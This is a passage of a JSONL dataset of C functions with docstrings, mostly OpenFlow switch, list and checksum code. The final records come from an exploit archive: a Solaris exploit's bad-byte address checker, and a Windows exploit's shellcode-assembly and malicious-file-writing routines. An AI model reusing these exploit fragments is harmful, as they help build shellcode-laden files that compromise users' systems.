project.\n    //\n    HWREG(NVIC_CPAC) = ((HWREG(NVIC_CPAC) &\n                         ~(NVIC_CPAC_CP10_M | NVIC_CPAC_CP11_M)) |\n                        NVIC_CPAC_CP10_FULL | NVIC_CPAC_CP11_FULL);\n\n    //\n    // Call the application's entry point.\n    //\n    main();\n}", "path": "unit\\range\\rx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* Removes 'elem' from its list and returns the element that followed it.\n   Undefined behavior if 'elem' is not in a list. */\n", "func_signal": "struct list *\nlist_remove(struct list *elem)", "code": "{\n  elem->prev->next = elem->next;\n  elem->next->prev = elem->prev;\n  return elem->next;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Returns the new checksum for a packet in which the checksum field previously\n * contained 'old_csum' and in which a field that contained 'old_u32' was\n * changed to contain 'new_u32'. */\n", "func_signal": "uint16_t\nrecalc_csum32(uint16_t old_csum, uint32_t old_u32, uint32_t new_u32)", "code": "{\n    return recalc_csum16(recalc_csum16(old_csum, old_u32, new_u32),\n                         old_u32 >> 16, new_u32 >> 16);\n}", "path": "lib\\csum.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Populate an nf2_of_action_wrap. */\n", "func_signal": "void\nnf2_populate_of_action(nf2_of_action_wrap *action, nf2_of_entry_wrap *entry,\n\t\t       struct sw_flow *flow)", "code": "{\n\tstruct sw_flow_actions *sfa;\n\tsize_t actions_len;\n\tuint8_t *p;\n\n\tsfa = flow->sf_acts;\n\tactions_len = sfa->actions_len;\n\tp = (uint8_t *)sfa->actions;\n\n\t// zero it out for now\n\tmemset(action, 0, sizeof(nf2_of_action_wrap));\n\taction->action.nf2_action_flag = 0;\n\n\twhile (actions_len > 0) {\n\t\tstruct ofp_action_header *acth = (struct ofp_action_header *)p;\n\t\tsize_t len = ntohs(acth->len);\n\n\t\tDBG_VERBOSE(\"Action Populate: Len of this action: %i\\n\", len);\n\t\tDBG_VERBOSE(\"Action Populate: Len of actions    : %i\\n\",\n\t\t\t    actions_len);\n\n\t\tif (acth->type == htons(OFPAT_OUTPUT)) {\n\t\t\tpopulate_action_output(action, entry, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_DL_SRC)) {\n\t\t\tpopulate_action_set_dl_src(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_DL_DST)) {\n\t\t\tpopulate_action_set_dl_dst(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_NW_SRC)) {\n\t\t\tpopulate_action_set_nw_src(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_NW_DST)) {\n\t\t\tpopulate_action_set_nw_dst(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_NW_TOS)) {\n\t\t\tpopulate_action_set_nw_tos(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_TP_SRC)) {\n\t\t\tpopulate_action_set_tp_src(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_TP_DST)) {\n\t\t\tpopulate_action_set_tp_dst(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_VLAN_VID)) {\n\t\t\tpopulate_action_set_vlan_vid(action, p);\n\t\t} else if (acth->type == htons(OFPAT_SET_VLAN_PCP)) {\n\t\t\tpopulate_action_set_vlan_pcp(action, p);\n\t\t} else if (acth->type == htons(OFPAT_STRIP_VLAN)) {\n\t\t\tpopulate_action_strip_vlan(action);\n\t\t}\n\n\t\tp += len;\n\t\tactions_len -= len;\n\t}\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Populate a nf2_of_mask_wrap with entries from a struct sw_flow's wildcards. */\n", "func_signal": "void\nnf2_populate_of_mask(nf2_of_mask_wrap *mask, struct sw_flow *flow)", "code": "{\n\tint vlan_vid = 0;\n\tint vlan_pcp = 0;\n\tint i;\n\n\tif (OFPFW_IN_PORT & flow->key.wildcards) {\n\t\tmask->entry.src_port = 0xFF;\n\t}\n\tif (OFPFW_DL_VLAN & flow->key.wildcards) {\n\t\tvlan_vid = VID_BITMASK;\n\t}\n\tif (OFPFW_DL_VLAN_PCP & flow->key.wildcards) {\n\t\tvlan_pcp = 0xF000;\n\t}\n\tmask->entry.vlan_id = vlan_pcp | vlan_vid;\n\tif (OFPFW_DL_SRC & flow->key.wildcards) {\n\t\tfor (i = 0; i < 6; ++i) {\n\t\t\tmask->entry.eth_src[i] = 0xFF;\n\t\t}\n\t}\n\tif (OFPFW_DL_DST & flow->key.wildcards) {\n\t\tfor (i = 0; i < 6; ++i) {\n\t\t\tmask->entry.eth_dst[i] = 0xFF;\n\t\t}\n\t}\n\tif (OFPFW_DL_TYPE & flow->key.wildcards)\n\t\tmask->entry.eth_type = 0xFFFF;\n\tif ((OFPFW_NW_SRC_ALL & flow->key.wildcards)\n\t    || (OFPFW_NW_SRC_MASK & flow->key.wildcards))\n\t\tmask->entry.ip_src = make_nw_wildcard\n\t\t\t(flow->key.wildcards >> OFPFW_NW_SRC_SHIFT);\n\tif ((OFPFW_NW_DST_ALL & flow->key.wildcards)\n\t    || (OFPFW_NW_DST_MASK & flow->key.wildcards))\n\t\tmask->entry.ip_dst = make_nw_wildcard\n\t\t\t(flow->key.wildcards >> OFPFW_NW_DST_SHIFT);\n\tif (OFPFW_NW_PROTO & flow->key.wildcards)\n\t\tmask->entry.ip_proto = 0xFF;\n\tif (OFPFW_TP_SRC & flow->key.wildcards)\n\t\tmask->entry.transp_src = 0xFFFF;\n\tif (OFPFW_TP_DST & flow->key.wildcards)\n\t\tmask->entry.transp_dst = 0xFFFF;\n\tif (OFPFW_NW_TOS & flow->key.wildcards)\n\t\tmask->entry.ip_tos = TOS_BITMASK;\n\n\tmask->entry.pad = 0x00;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Returns the number of elements in 'list'.\n   Runs in O(n) in the number of elements. */\n", "func_signal": "size_t\nlist_size(const struct list *list)", "code": "{\n  const struct list *e;\n  size_t cnt = 0;\n\n  for (e = list->next; e != list; e = e->next)\n    cnt++;\n  return cnt;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Setup the wildcard table by adding static flows that will handle\n * misses by sending them up to the cpu ports, and handle packets coming\n * back down from the cpu by sending them out the corresponding port.\n */\n", "func_signal": "int\nnf2_write_static_wildcard(void)", "code": "{\n\tnf2_of_entry_wrap entry;\n\tnf2_of_mask_wrap mask;\n\tnf2_of_action_wrap action;\n\tint i;\n\tstruct nf2device *dev;\n\n\tdev = nf2_get_net_device();\n\tif (dev == NULL)\n\t\treturn 1;\n\n\tmemset(&entry, 0x00, sizeof(nf2_of_entry_wrap));\n\tmemset(&mask, 0xFF, sizeof(nf2_of_mask_wrap));\n\t// Only non-wildcard section is the source port\n\tmask.entry.src_port = 0;\n\tmemset(&action, 0, sizeof(nf2_of_action_wrap));\n\n\t// write the catch all entries to send to the cpu\n\tfor (i = 0; i < 4; ++i) {\n\t\tentry.entry.src_port = i * 2;\n\t\taction.action.forward_bitmask = 0x1 << ((i * 2) + 1);\n\t\tnf2_write_of_wildcard(dev, (OPENFLOW_WILDCARD_TABLE_SIZE - 4)\n\t\t\t\t      + i, &entry, &mask, &action);\n\t}\n\n\t// write the entries to send out packets coming from the cpu\n\tfor (i = 0; i < 4; ++i) {\n\t\tentry.entry.src_port = (i * 2) + 1;\n\t\taction.action.forward_bitmask = 0x1 << (i * 2);\n\t\tnf2_write_of_wildcard(dev, (OPENFLOW_WILDCARD_TABLE_SIZE - 8)\n\t\t\t\t      + i, &entry, &mask, &action);\n\t}\n\n\tnf2_free_net_device(dev);\n\treturn 0;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Add a free hardware entry back to the wildcard pool. */\n", "func_signal": "void\nnf2_add_free_wildcard(struct nf2_flow *sfw)", "code": "{\n\t// clear the hw values\n\tsfw->hw_packet_count = 0;\n\tsfw->hw_byte_count = 0;\n\n\t// Critical section, adding to the actual list\n\tlist_insert(&wildcard_free_list, &sfw->node);\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Inserts 'elem' just before 'before'. */\n", "func_signal": "void\nlist_insert(struct list *before, struct list *elem)", "code": "{\n  elem->prev = before->prev;\n  elem->next = before;\n  before->prev->next = elem;\n  before->prev = elem;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Retrieves the type of table this flow should go into. */\n", "func_signal": "int\nnf2_get_table_type(struct sw_flow *flow)", "code": "{\n\tif (flow->key.wildcards != 0) {\n\t\tDBG_VERBOSE(\"--- TABLE TYPE: WILDCARD ---\\n\");\n\t\treturn NF2_TABLE_WILDCARD;\n\t} else {\n\t\tDBG_VERBOSE(\"--- TABLE TYPE: EXACT ---\\n\");\n\t\treturn NF2_TABLE_EXACT;\n\t}\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Returns 1 if this flow contains an action outputting to all ports except\n * input port, 0 otherwise. We support OFPP_ALL and OFPP_FLOOD actions, however\n * since we do not perform the spanning tree protocol (STP) then OFPP_FLOOD is\n * equivalent to OFPP_ALL.\n */\n", "func_signal": "static int\nis_action_forward_all(struct sw_flow *flow)", "code": "{\n\tstruct sw_flow_actions *sfa;\n\tsize_t actions_len;\n\tuint8_t *p;\n\n\tsfa = flow->sf_acts;\n\tactions_len = sfa->actions_len;\n\tp = (uint8_t *)sfa->actions;\n\n\twhile (actions_len > 0) {\n\t\tstruct ofp_action_header *ah = (struct ofp_action_header *)p;\n\t\tstruct ofp_action_output *oa = (struct ofp_action_output *)p;\n\t\tsize_t len = ntohs(ah->len);\n\n\t\tDBG_VERBOSE(\"Fwd Action Chk: Action type: %x\\n\",\n\t\t\t    ntohs(ah->type));\n\t\tDBG_VERBOSE(\"Fwd Action Chk: Output port: %x\\n\",\n\t\t\t    ntohs(oa->port));\n\t\tDBG_VERBOSE(\"Fwd Action Chk: Len of this action: %i\\n\", len);\n\t\tDBG_VERBOSE(\"Fwd Action Chk: Len of actions    : %i\\n\",\n\t\t\t    actions_len);\n\t\t// Currently only support the output port(s) action\n\t\tif (ntohs(ah->type) == OFPAT_OUTPUT\n\t\t    && (ntohs(oa->port) == OFPP_ALL\n\t\t\t|| ntohs(oa->port) == OFPP_FLOOD)) {\n\t\t\treturn 1;\n\t\t}\n\t\tp += len;\n\t\tactions_len -= len;\n\t}\n\n\treturn 0;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Returns the front element in 'list'.\n   Undefined behavior if 'list' is empty. */\n", "func_signal": "struct list *\nlist_front(struct list *list)", "code": "{\n  assert(!list_is_empty(list));\n  return list->next;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Called when the table is being deleted. */\n", "func_signal": "void\nnf2_destroy_wildcard_freelist(void)", "code": "{\n\tstruct nf2_flow *sfw = NULL;\n\n\twhile (!list_is_empty(&wildcard_free_list)) {\n\t\tsfw = CONTAINER_OF(list_front(&wildcard_free_list), struct nf2_flow, node);\n\t\tlist_remove(&sfw->node);\n\t\tfree(sfw);\n\t}\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Puts 'elem' in the position currently occupied by 'position'.\n * Afterward, 'position' is not part of a list. */\n", "func_signal": "void\nlist_replace(struct list *element, const struct list *position)", "code": "{\n    element->next = position->next;\n    element->next->prev = element;\n    element->prev = position->prev;\n    element->prev->next = element;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Checks to see if the actions requested by the flow are capable of being\n * done in the NF2 hardware. Returns 1 if yes, 0 for no.\n */\n", "func_signal": "int\nnf2_are_actions_supported(struct sw_flow *flow)", "code": "{\n\tstruct sw_flow_actions *sfa;\n\tsize_t actions_len;\n\tuint8_t *p;\n\n\tsfa = flow->sf_acts;\n\tactions_len = sfa->actions_len;\n\tp = (uint8_t *)sfa->actions;\n\n\twhile (actions_len > 0) {\n\t\tstruct ofp_action_header *ah = (struct ofp_action_header *)p;\n\t\tstruct ofp_action_output *oa = (struct ofp_action_output *)p;\n\t\tsize_t len = ntohs(ah->len);\n\n\t\tDBG_VERBOSE(\"Action Support Chk: Len of this action: %i\\n\",\n\t\t\t    len);\n\t\tDBG_VERBOSE(\"Action Support Chk: Len of actions    : %i\\n\",\n\t\t\t    actions_len);\n\n\t\t// All the modify actions are supported.\n\t\t// Each of them can be specified once otherwise overwritten.\n\t\t// Output action happens last.\n\t\tif (!(ntohs(ah->type) == OFPAT_OUTPUT\n\t\t      || ntohs(ah->type) == OFPAT_SET_DL_SRC\n\t\t      || ntohs(ah->type) == OFPAT_SET_DL_DST\n\n\t\t      || ntohs(ah->type) == OFPAT_SET_NW_SRC\n\t\t      || ntohs(ah->type) == OFPAT_SET_NW_DST\n\n\t\t      || ntohs(ah->type) == OFPAT_SET_NW_TOS\n\n\t\t      || ntohs(ah->type) == OFPAT_SET_TP_SRC\n\t\t      || ntohs(ah->type) == OFPAT_SET_TP_DST\n\n\t\t      || ntohs(ah->type) == OFPAT_SET_VLAN_VID\n\t\t      || ntohs(ah->type) == OFPAT_SET_VLAN_PCP\n\t\t      || ntohs(ah->type) == OFPAT_STRIP_VLAN)) {\n\t\t\tDBG_VERBOSE\n\t\t\t\t(\"Flow action type %#0x not supported in hardware\\n\",\n\t\t\t\t ntohs(ah->type));\n\t\t\treturn 0;\n\t\t}\n\t\t// Only support ports 1-4(incl. IN_PORT), ALL, FLOOD.\n\t\t// Let CONTROLLER/LOCAL fall through\n\t\tif ((ntohs(ah->type) == OFPAT_OUTPUT)\n\t\t    && (!((ntohs(oa->port) >= PORT_BASE)\n\t\t\t  && (ntohs(oa->port) <= MAX_IFACE))\n\t\t\t&& !(ntohs(oa->port) == OFPP_ALL)\n\t\t\t&& !(ntohs(oa->port) == OFPP_FLOOD)\n\t\t\t&& !(ntohs(oa->port) == OFPP_IN_PORT))) {\n\t\t\tDBG_VERBOSE\n\t\t\t\t(\"Flow action output port %#0x is not supported in hardware\\n\",\n\t\t\t\t ntohs(oa->port));\n\t\t\treturn 0;\n\t\t}\n\t\tp += len;\n\t\tactions_len -= len;\n\t}\n\n\treturn 1;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Hashes the entry to find where it should exist in the exact table\n * returns NULL on failure\n */\n", "func_signal": "static struct nf2_flow *\nget_free_exact(nf2_of_entry_wrap *entry)", "code": "{\n\tunsigned int poly1 = 0x04C11DB7;\n\tunsigned int poly2 = 0x1EDC6F41;\n\tstruct nf2_flow *sfw = NULL;\n\tunsigned int hash = 0x0;\n\tunsigned int index = 0x0;\n\tstruct crc32 crc;\n\n\tcrc32_init(&crc, poly1);\n\thash = crc32_calculate(&crc, entry, sizeof(nf2_of_entry_wrap));\n\n\t// the bottom 15 bits of hash == the index into the table\n\tindex = 0x7FFF & hash;\n\n\t// if this index is free, grab it\n\tsfw = exact_free_list[index];\n\texact_free_list[index] = NULL;\n\n\tif (sfw != NULL) {\n\t\treturn sfw;\n\t}\n\t// try the second index\n\tcrc32_init(&crc, poly2);\n\thash = crc32_calculate(&crc, entry, sizeof(nf2_of_entry_wrap));\n\t// the bottom 15 bits of hash == the index into the table\n\tindex = 0x7FFF & hash;\n\n\t// if this index is free, grab it\n\tsfw = exact_free_list[index];\n\texact_free_list[index] = NULL;\n\n\t// return whether its good or not\n\treturn sfw;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Returns the new checksum for a packet in which the checksum field previously\n * contained 'old_csum' and in which a field that contained 'old_u16' was\n * changed to contain 'new_u16'. */\n", "func_signal": "uint16_t\nrecalc_csum16(uint16_t old_csum, uint16_t old_u16, uint16_t new_u16)", "code": "{\n    /* Ones-complement arithmetic is endian-independent, so this code does not\n     * use htons() or ntohs().\n     *\n     * See RFC 1624 for formula and explanation. */\n    uint16_t hc_complement = ~old_csum;\n    uint16_t m_complement = ~old_u16;\n    uint16_t m_prime = new_u16;\n    uint32_t sum = hc_complement + m_complement + m_prime;\n    uint16_t hc_prime_complement = sum + (sum >> 16);\n    return ~hc_prime_complement;\n}", "path": "lib\\csum.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Attempts to build and write the flow to hardware.\n * Returns 0 on success, 1 on failure.\n */\n", "func_signal": "int\nnf2_build_and_write_flow(struct sw_flow *flow)", "code": "{\n\tstruct nf2_flow *sfw = NULL;\n\tstruct nf2_flow *sfw_next = NULL;\n\tstruct nf2device *dev;\n\tint num_entries = 0;\n\tint i, table_type;\n\tnf2_of_entry_wrap key;\n\tnf2_of_mask_wrap mask;\n\tnf2_of_action_wrap action;\n\n\tmemset(&key, 0, sizeof(nf2_of_entry_wrap));\n\tmemset(&mask, 0, sizeof(nf2_of_mask_wrap));\n\tmemset(&action, 0, sizeof(nf2_of_action_wrap));\n\n\tdev = nf2_get_net_device();\n\tif (dev == NULL) {\n\t\treturn 1;\n\t}\n\n\ttable_type = nf2_get_table_type(flow);\n\tswitch (table_type) {\n\tdefault:\n\t\tbreak;\n\n\tcase NF2_TABLE_EXACT:\n\t\tDBG_VERBOSE(\"---Exact Entry---\\n\");\n\t\tnf2_populate_of_entry(&key, flow);\n\t\tnf2_populate_of_action(&action, &key, flow);\n\t\tsfw = get_free_exact(&key);\n\t\tif (sfw == NULL) {\n\t\t\tDBG_VERBOSE\n\t\t\t\t(\"Collision getting free exact match entry\\n\");\n\t\t\t// collision\n\t\t\tnf2_free_net_device(dev);\n\t\t\treturn 1;\n\t\t}\n\t\t// set the active bit on this entry\n\t\tkey.entry.pad = 0x80;\n\t\tnf2_write_of_exact(dev, sfw->pos, &key, &action);\n\t\tflow->private = (void *)sfw;\n\t\tbreak;\n\n\tcase NF2_TABLE_WILDCARD:\n\t\tDBG_VERBOSE(\"---Wildcard Entry---\\n\");\n\t\t// if action is all out and source port is wildcarded\n\t\tif ((is_action_forward_all(flow)) &&\n\t\t    (flow->key.wildcards & OFPFW_IN_PORT)) {\n\t\t\tDBG_VERBOSE(\"Grab four wildcard tables\\n\");\n\t\t\tif (!(sfw = get_free_wildcard())) {\n\t\t\t\tDBG_VERBOSE(\"No free wildcard entries found.\");\n\t\t\t\t// no free entries\n\t\t\t\tnf2_free_net_device(dev);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t// try to get 3 more positions\n\t\t\tfor (i = 0; i < 3; ++i) {\n\t\t\t\tif (!(sfw_next = get_free_wildcard())) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlist_insert(&sfw->node, &sfw_next->node);\n\t\t\t\t++num_entries;\n\t\t\t}\n\n\t\t\tif (num_entries < 3) {\n\t\t\t\t// failed to get enough entries, return them and exit\n\t\t\t\tnf2_delete_private((void *)sfw);\n\t\t\t\tnf2_free_net_device(dev);\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\tnf2_populate_of_entry(&key, flow);\n\t\t\tnf2_populate_of_mask(&mask, flow);\n\n\t\t\t// set first entry's src port to 0, remove wildcard mask on src\n\t\t\tkey.entry.src_port = 0;\n\t\t\tmask.entry.src_port = 0;\n\t\t\tnf2_populate_of_action(&action, &key, flow);\n\t\t\tnf2_write_of_wildcard(dev, sfw->pos, &key, &mask,\n\t\t\t\t\t      &action);\n\n\t\t\ti = 1;\n\t\t\tsfw_next = CONTAINER_OF(list_front(&sfw->node),\n\t\t\t\t\t      struct nf2_flow, node);\n\t\t\t// walk through and write the remaining 3 entries\n\t\t\twhile (sfw_next != sfw) {\n\t\t\t\tkey.entry.src_port = i * 2;\n\t\t\t\tnf2_populate_of_action(&action, &key, flow);\n\t\t\t\tnf2_write_of_wildcard(dev, sfw_next->pos, &key,\n\t\t\t\t\t\t      &mask, &action);\n\t\t\t\tsfw_next = CONTAINER_OF(list_front(&sfw_next->node),\n\t\t\t\t\t\t      struct nf2_flow, node);\n\t\t\t\t++i;\n\t\t\t}\n\t\t\tflow->private = (void *)sfw;\n\t\t} else {\n\t\t\t/* Get a free position here, and write to it */\n\t\t\tif ((sfw = get_free_wildcard())) {\n\t\t\t\tnf2_populate_of_entry(&key, flow);\n\t\t\t\tnf2_populate_of_mask(&mask, flow);\n\t\t\t\tnf2_populate_of_action(&action, &key, flow);\n\t\t\t\tif (nf2_write_of_wildcard\n\t\t\t\t    (dev, sfw->pos, &key, &mask, &action)) {\n\t\t\t\t\t// failure writing to hardware\n\t\t\t\t\tnf2_add_free_wildcard(sfw);\n\t\t\t\t\tDBG_VERBOSE\n\t\t\t\t\t\t(\"Failure writing to hardware\\n\");\n\t\t\t\t\tnf2_free_net_device(dev);\n\t\t\t\t\treturn 1;\n\t\t\t\t} else {\n\t\t\t\t\t// success writing to hardware, store the position\n\t\t\t\t\tflow->private = (void *)sfw;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// hardware is full, return 0\n\t\t\t\tDBG_VERBOSE(\"No free wildcard entries found.\");\n\t\t\t\tnf2_free_net_device(dev);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n\tnf2_free_net_device(dev);\n\treturn 0;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Adds the 'n' bytes in 'data' to the partial IP checksum 'partial' and\n * returns the updated checksum.  (To start a new checksum, pass 0 for\n * 'partial'.  To obtain the finished checksum, pass the return value to\n * csum_finish().) */\n", "func_signal": "uint32_t\ncsum_continue(uint32_t partial, const void *data_, size_t n)", "code": "{\n    const uint16_t *data = data_;\n\n    for (; n > 1; n -= 2) {\n        partial = csum_add16(partial, *data++);\n    }\n    if (n) {\n        partial += *(uint8_t *) data;\n    }\n    return partial;\n}", "path": "lib\\csum.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Get the first free position in the wildcard hardware table\n * to write into.\n */\n", "func_signal": "static struct nf2_flow *\nget_free_wildcard(void)", "code": "{\n\tstruct nf2_flow *sfw = NULL;\n\n\t// Critical section, pulling the first available from the list\n\tif (list_is_empty(&wildcard_free_list)) {\n\t\t// empty :(\n\t\tsfw = NULL;\n\t} else {\n\t\tsfw = CONTAINER_OF(list_front(&wildcard_free_list), struct nf2_flow, node);\n\t\tlist_remove(&sfw->node);\n\t\tlist_init(&sfw->node);\n\t}\n\n\treturn sfw;\n}", "path": "hw-lib\\nf2\\nf2_lib.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/* Removes the back element from 'list' and returns it.\n   Undefined behavior if 'list' is empty before removal. */\n", "func_signal": "struct list *\nlist_pop_back(struct list *list)", "code": "{\n  struct list *back = list->prev;\n  list_remove(back);\n  return back;\n}", "path": "lib\\list.c", "repo_name": "noxrepo/openflow", "stars": 51, "license": "other", "language": "c", "size": 11338}
{"docstring": "/*\n * check_addr(): check an address for 0x00, 0x04, 0x0a, 0x0d or 0x61-0x7a bytes\n */\n", "func_signal": "void check_addr(int addr, char *pattern)", "code": "{\n\t/* check for NULL byte (0x00) */\n\tif (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||\n\t    !(addr & 0xff000000)) {\n\t\tfprintf(stderr, \"Error: %s contains a 0x00!\\n\", pattern);\n\t\texit(1);\n\t}\n\n\t/* check for EOT byte (0x04) */\n\tif (((addr & 0xff) == 0x04) || ((addr & 0xff00) == 0x0400) ||\n\t    ((addr & 0xff0000) == 0x040000) || \n\t    ((addr & 0xff000000) == 0x04000000)) {\n\t\tfprintf(stderr, \"Error: %s contains a 0x04!\\n\", pattern);\n\t\texit(1);\n\t}\n\n\t/* check for NL byte (0x0a) */\n\tif (((addr & 0xff) == 0x0a) || ((addr & 0xff00) == 0x0a00) ||\n\t    ((addr & 0xff0000) == 0x0a0000) || \n\t    ((addr & 0xff000000) == 0x0a000000)) {\n\t\tfprintf(stderr, \"Error: %s contains a 0x0a!\\n\", pattern);\n\t\texit(1);\n\t}\n\n\t/* check for CR byte (0x0d) */\n\tif (((addr & 0xff) == 0x0d) || ((addr & 0xff00) == 0x0d00) ||\n\t    ((addr & 0xff0000) == 0x0d0000) || \n\t    ((addr & 0xff000000) == 0x0d000000)) {\n\t\tfprintf(stderr, \"Error: %s contains a 0x0d!\\n\", pattern);\n\t\texit(1);\n\t}\n\n\t/* check for lowercase chars (0x61-0x7a) */\n\tif ((islower(addr & 0xff)) || (islower((addr & 0xff00) >> 8)) ||\n\t    (islower((addr & 0xff0000) >> 16)) || \n\t    (islower((addr & 0xff000000) >> 24))) {\n\t\tfprintf(stderr, \"Error: %s contains a 0x61-0x7a!\\n\", pattern);\n\t\texit(1);\n\t}\n}", "path": "platforms\\solaris\\local\\715.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n// ??ShellCode\n//--------------------------------------------------------------------------------\n", "func_signal": "void Make_ShellCode()", "code": "{\n   unsigned char  sc[1024] = {0};\n   unsigned int   len = 0;\n\n   int i,j,k,l;\n\n   Sc_len = sizeof(SC)-1;\n   memcpy(sc, SC, Sc_len);\n     \n   // Add Size Var\n   memcpy(sc+Sc_len, &dwFileSize, 4);\n   memcpy(sc+Sc_len+4, &dwOffsetSize, 4);\n   memcpy(sc+Sc_len+4+4, &dwExeSize, 4);\n   memcpy(sc+Sc_len+4+4+4, &dwExeXor, 4);\n   Sc_len += 16;\n\n   memcpy(&Decode[SC_LEN_OFFSET], &Sc_len, 2);\n   \n   //printf(\"// %d bytes decode \\r\\n\", strlen(Decode));\n   //PrintSc(Decode, DC_LEN);\n\n   memset(RunSC, 0, sizeof(RunSC));\n   memcpy(RunSC, sc, Sc_len);\n   \n   //printf(\"// %d bytes shellcode \\r\\n\", Sc_len);\n   //PrintSc(RunSC, Sc_len);\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n// ????\n//--------------------------------------------------------------------------------\n", "func_signal": "void PutFile(char *szFile)", "code": "{\n   DWORD       dwBytes  = 0;\n   DWORD       dwCount  = 0;\n   DWORD       dwOffset = 0;\n   int         i        = 0;\n   \n\n   __try\n   {        \n       hFile = CreateFile(szFile,\n           GENERIC_WRITE,\n           FILE_SHARE_READ,\n           NULL,\n           CREATE_ALWAYS,\n           FILE_ATTRIBUTE_NORMAL,\n           0);\n\n       if(hFile == INVALID_HANDLE_VALUE)\n       {\n           printf(\"[-] Create file %s error!\\n\", szFile);\n           __leave;            \n       }\n\n       pFile = (char*)malloc(BUFF_SIZE);\n       if(!pFile)\n       {\n           printf(\"[-] pFile malloc buffer error!\\n\");\n           __leave;\n       }\n\n       memset(pFile, 0, BUFF_SIZE);\n       \n       \n       //--------------------------------------------\n       // Append LHA File\n       //--------------------------------------------\n       if(bAppend)\n       {\n           hAppend = CreateFile(AppFile,\n               GENERIC_READ,\n               FILE_SHARE_READ,\n               NULL,\n               OPEN_EXISTING,\n               FILE_ATTRIBUTE_NORMAL,\n               0);\n   \n           if(hAppend == INVALID_HANDLE_VALUE)\n           {\n               printf(\"[-] Open file %s error!\\n\", AppFile);\n              // __leave;        \n              exit(1);\n                   \n           }\n       \n           dwFileSize = GetFileSize(hAppend, 0);\n           \n           if(!dwFileSize)\n           {\n               printf(\"[-] Get AppendFile   : %s size error!\\n\", AppFile);\n               __leave;  \n           }\n           \n           printf(\"[+] Get AppendFile   : %s (size:%d).\\n\", AppFile, dwFileSize);\n           \n           pAppend = (char *)malloc(dwFileSize);\n           if(!pAppend)\n           {\n               printf(\"[-] pAppend malloc buff error!\\n\");\n               __leave;\n           }\n           memset(pAppend, 0, dwFileSize);\n                   \n           if(!ReadFile(hAppend, pAppend, dwFileSize, &dwBytes, NULL))\n           {\n               printf(\"[-] ReadFile error!\\n\");\n               __leave;\n           }\n           \n           CloseHandle(hAppend);\n           hAppend=INVALID_HANDLE_VALUE;\n           \n           dwFileSize --;\n           \n           WriteFile(hFile, pAppend, dwFileSize, &dwBytes, NULL);  \n           printf(\"[+] Write AppendData : %s (%d bytes)\\n\", szFile, dwFileSize);\n           \n           free(pAppend);\n           \n       }      \n               \n       hAppend = CreateFile(ExeFile,\n               GENERIC_READ,\n               FILE_SHARE_READ,\n               NULL,\n               OPEN_EXISTING,\n               FILE_ATTRIBUTE_NORMAL,\n               0);\n   \n       if(hAppend == 